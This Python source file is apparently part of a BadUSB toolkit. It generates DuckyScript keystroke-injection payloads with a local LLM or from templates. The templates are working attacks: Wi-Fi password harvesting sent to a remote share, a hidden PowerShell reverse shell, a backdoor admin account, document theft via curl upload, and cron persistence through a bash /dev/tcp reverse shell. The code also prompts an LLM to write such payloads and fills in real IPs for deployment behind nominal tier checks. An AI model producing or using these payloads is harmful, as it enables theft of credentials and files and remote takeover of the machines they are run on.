#!/usr/bin/env python3
"""
ERR0RS BadUSB Studio — AI Payload Generator
Generates DuckyScript and CircuitPython HID payloads using the local LLM.
Falls back to template-based generation when Ollama is unavailable.

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import re
import json
import urllib.request
import urllib.error
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parents[3]

# ── Template library for offline/fallback generation ──────────────────────────
PAYLOAD_TEMPLATES = {
    "wifi_harvest": {
        "description": "Harvest saved WiFi passwords (Windows)",
        "os": "windows",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING cmd /c netsh wlan show profiles | findstr "All User" > %TEMP%\\wifi.txt && for /f "tokens=2 delims=:" %i in ('type %TEMP%\\wifi.txt') do @netsh wlan show profile name=%i key=clear >> %TEMP%\\wifipass.txt 2>nul && type %TEMP%\\wifipass.txt > \\\\LHOST\\share\\wifi.txt
ENTER
"""
    },
    "reverse_shell_win": {
        "description": "PowerShell reverse shell (Windows)",
        "os": "windows",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -e BASE64_PAYLOAD_HERE
ENTER
"""
    },
    "system_info_win": {
        "description": "Dump system info to network share (Windows)",
        "os": "windows",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING cmd /c systeminfo > %TEMP%\\sysinfo.txt & ipconfig /all >> %TEMP%\\sysinfo.txt & net user >> %TEMP%\\sysinfo.txt
ENTER
"""
    },
    "lock_screen_bypass": {
        "description": "Open terminal on lock screen attempt",
        "os": "linux",
        "script": """DELAY 500
CTRL ALT t
DELAY 1000
STRING id && whoami && uname -a
ENTER
"""
    },
    "add_admin_user": {
        "description": "Add backdoor admin user (Windows - requires admin)",
        "os": "windows",
        "script": """DELAY 1000
GUI r
DELAY 500
STRING cmd /c net user err0rs P@ssw0rd123! /add && net localgroup administrators err0rs /add
ENTER
"""
    },
    "exfil_docs": {
        "description": "Exfiltrate documents via curl (Linux)",
        "os": "linux",
        "script": """DELAY 500
CTRL ALT t
DELAY 1000
STRING find ~/Documents -name "*.pdf" -o -name "*.docx" | head -20 | xargs -I{} curl -s -F "file=@{}" http://LHOST:PORT/upload &
ENTER
"""
    },
    "persist_cron": {
        "description": "Establish cron persistence (Linux)",
        "os": "linux",
        "script": """DELAY 500
CTRL ALT t
DELAY 1000
STRING (crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'") | crontab -
ENTER
"""
    },
}


class PayloadGenerator:
    """
    AI-powered DuckyScript payload generator.
    Uses local Ollama LLM when available, falls back to templates.
    """

    OLLAMA_URL = "http://localhost:11434/api/generate"
    DEFAULT_MODEL = "gemma3:1b"  # Pi 5 verified — see docs/STRESS_TESTS/FINDINGS_2026-05-20.md

    SYSTEM_PROMPT = """You are an expert BadUSB payload developer for authorized penetration testing.
Generate DuckyScript payloads that are precise, effective, and follow best practices.
Always start with appropriate DELAY values. Use proper DuckyScript syntax.
Only output the DuckyScript code — no explanations, no markdown fences."""

    def __init__(self, ai_client=None, model: str = None):
        self.ai_client = ai_client
        self.model = model or self.DEFAULT_MODEL
        self._ollama_available = self._check_ollama()

    def _check_ollama(self) -> bool:
        try:
            req = urllib.request.Request(
                "http://localhost:11434/api/tags",
                method="GET"
            )
            with urllib.request.urlopen(req, timeout=3) as r:
                return r.status == 200
        except Exception:
            return False

    def generate(self, description: str, target_os: str = "windows",
                 output_format: str = "duckyscript") -> str:
        """
        Generate a payload from a natural language description.
        Tries Ollama first, falls back to template matching.

        Returns the RAW payload with LHOST/PORT/USER_IP placeholders
        still present as literals. For a tier-aware variant that
        substitutes the user's real IP and tags deploy-vs-preview,
        use generate_tiered() instead.
        """
        # Try template match first (fast path)
        template_match = self._match_template(description, target_os)
        if template_match and not self._ollama_available:
            return template_match

        # Try Ollama generation
        if self._ollama_available:
            result = self._generate_ollama(description, target_os, output_format)
            if result:
                return result

        # Fall back to template or generic stub
        return template_match or self._generic_stub(description, target_os)

    def generate_tiered(self, description: str, target_os: str = "windows",
                        output_format: str = "duckyscript",
                        port: int = 4444) -> dict:
        """
        Generate a payload with tier-aware output. Returns a dict that the
        UI uses to decide what to show and whether 'deploy' is permitted.

        Output shape:
            {
                'template':   raw text with {LHOST}/{PORT} placeholders unsubstituted
                              (always present, every tier)
                'preview':    text with the user's real IP/host substituted in
                              (LEARN+: visible; EXPLORE: same as template)
                'deployable': text identical to preview but ready to write to
                              a USB drive. Present ONLY in OPERATE tier; key
                              is missing or None otherwise.
                'tier':       'EXPLORE' | 'LEARN' | 'OPERATE'
                'user_ip':    the IP that was substituted (None if EXPLORE)
                'port':       the port that was substituted
                'warnings':   list of strings shown to the user before deploy
            }

        SAFETY CONTRACT:
          - EXPLORE never sees the user's real IP. Template only.
          - LEARN sees the preview but 'deployable' stays None (UI grays out
            the deploy button).
          - OPERATE + valid attestation gets the deployable form with explicit
            CFAA warnings attached.
        """
        raw = self.generate(description, target_os, output_format)

        try:
            from src.ai.host_context import substitute_placeholders, get_lan_ip
        except ImportError:
            substitute_placeholders = None
            get_lan_ip = lambda: None

        tier_name = "EXPLORE"
        user_ip = None
        warnings: list[str] = []
        try:
            from src.security.operator_tier import (
                current_tier, OperatorTier, has_valid_attestation,
            )
            tier = current_tier()
            tier_name = tier.label()
        except Exception:
            tier = None
            has_valid_attestation = lambda: False

        substituted = raw
        if substitute_placeholders is not None and tier_name in ("LEARN", "OPERATE"):
            user_ip = get_lan_ip()
            if user_ip:
                # Brace-form substitution from host_context
                substituted = substitute_placeholders(
                    substituted,
                    extra={"PORT": str(port)},
                    user_ip=user_ip,
                )
                # Bare-word substitution for legacy templates ('LHOST', 'PORT'
                # without braces). Word-boundary regex so we don't eat
                # substrings like 'LHOSTNAME'.
                import re as _re_sub
                substituted = _re_sub.sub(r"\bLHOST\b", user_ip, substituted)
                substituted = _re_sub.sub(r"\bPORT\b",  str(port),  substituted)

        result = {
            "template":   raw,
            "preview":    substituted,
            "deployable": None,
            "tier":       tier_name,
            "user_ip":    user_ip if tier_name in ("LEARN", "OPERATE") else None,
            "port":       port,
            "warnings":   warnings,
        }

        if tier_name == "OPERATE":
            try:
                if has_valid_attestation():
                    result["deployable"] = substituted
                    warnings.append(
                        f"⚠️  This payload is ARMED — it points to YOUR machine "
                        f"({user_ip}:{port}). Anyone running it will connect back "
                        f"to you. Unauthorized deployment is a CFAA violation."
                    )
                    if user_ip and not user_ip.startswith("127."):
                        warnings.append(
                            f"⚠️  Your machine ({user_ip}) is on a routable network. "
                            f"This payload will succeed against any host that can "
                            f"reach your LAN."
                        )
                else:
                    warnings.append(
                        "OPERATE tier is set but no valid attestation on file. "
                        "Deploy is locked. Complete the attestation prompt at "
                        "launcher startup to unlock."
                    )
            except Exception:
                pass
        elif tier_name == "LEARN":
            warnings.append(
                "Preview only — LEARN tier shows what the real payload would "
                "look like, but does not produce a deployable file. Set "
                "ERR0RS_OPERATOR_TIER=operate in .env and complete attestation "
                "to enable deploy."
            )

        return result

    def _match_template(self, description: str, target_os: str) -> str | None:
        """Find the best matching template for the description."""
        desc_lower = description.lower()
        best_match = None
        best_score = 0

        keywords = {
            "wifi_harvest": ["wifi", "password", "wireless", "wlan", "harvest"],
            "reverse_shell_win": ["reverse shell", "shell", "backdoor", "connect back"],
            "system_info_win": ["sysinfo", "system info", "enumerate", "recon", "info"],
            "lock_screen_bypass": ["lock screen", "lockscreen", "bypass lock"],
            "add_admin_user": ["admin user", "add user", "backdoor user", "persistence user"],
            "exfil_docs": ["exfil", "exfiltrate", "steal", "documents", "files"],
            "persist_cron": ["persist", "cron", "persistence", "maintain access"],
        }

        for template_key, kws in keywords.items():
            template = PAYLOAD_TEMPLATES.get(template_key, {})
            if template.get("os", "windows") != target_os and target_os != "cross":
                if template.get("os") != target_os:
                    continue
            score = sum(1 for kw in kws if kw in desc_lower)
            if score > best_score:
                best_score = score
                best_match = template_key

        if best_match and best_score > 0:
            return PAYLOAD_TEMPLATES[best_match]["script"].strip()
        return None

    def _generate_ollama(self, description: str, target_os: str,
                          output_format: str) -> str | None:
        """Generate payload using Ollama LLM."""
        prompt = (
            f"Generate a {output_format} BadUSB payload for authorized penetration testing.\n"
            f"Target OS: {target_os}\n"
            f"Task: {description}\n\n"
            f"Output only the {output_format} code. No explanations."
        )

        payload = json.dumps({
            "model": self.model,
            "prompt": prompt,
            "system": self.SYSTEM_PROMPT,
            "stream": False,
            "options": {"temperature": 0.3, "num_predict": 512}
        }).encode()

        try:
            req = urllib.request.Request(
                self.OLLAMA_URL,
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=20) as r:
                result = json.loads(r.read().decode())
                response = result.get("response", "").strip()
                # Strip any markdown fences the model might add
                response = re.sub(r"```[a-z]*\n?", "", response).strip()
                return response if response else None
        except Exception:
            return None

    def refine(self, payload: str, feedback: str) -> str:
        """Refine an existing payload based on feedback."""
        if not self._ollama_available:
            return payload + f"\n\n# Refinement requested: {feedback}\n# (Ollama offline — apply manually)"

        prompt = (
            f"Refine this BadUSB payload based on feedback.\n\n"
            f"Current payload:\n{payload}\n\n"
            f"Feedback: {feedback}\n\n"
            f"Output only the refined DuckyScript code."
        )

        data = json.dumps({
            "model": self.model,
            "prompt": prompt,
            "system": self.SYSTEM_PROMPT,
            "stream": False,
            "options": {"temperature": 0.2, "num_predict": 512}
        }).encode()

        try:
            req = urllib.request.Request(
                self.OLLAMA_URL, data=data,
                headers={"Content-Type": "application/json"}, method="POST"
            )
            with urllib.request.urlopen(req, timeout=20) as r:
                result = json.loads(r.read().decode())
                refined = result.get("response", "").strip()
                refined = re.sub(r"```[a-z]*\n?", "", refined).strip()
                return refined or payload
        except Exception:
            return payload

    def _generic_stub(self, description: str, target_os: str) -> str:
        """Return a documented stub when no template matches."""
        return (
            f"REM ERR0RS BadUSB Payload\n"
            f"REM Task: {description}\n"
            f"REM Target OS: {target_os}\n"
            f"REM Generated: offline stub — start Ollama for AI generation\n\n"
            f"DELAY 1000\n"
            f"REM TODO: Add your DuckyScript commands here\n"
            f"REM Reference: https://docs.hak5.org/hak5-usb-rubber-ducky\n"
        )

    def list_templates(self) -> list[dict]:
        """Return all available templates."""
        return [
            {"key": k, "description": v["description"], "os": v["os"]}
            for k, v in PAYLOAD_TEMPLATES.items()
        ]

    def get_template(self, key: str) -> str | None:
        """Return a specific template by key."""
        t = PAYLOAD_TEMPLATES.get(key)
        return t["script"].strip() if t else None
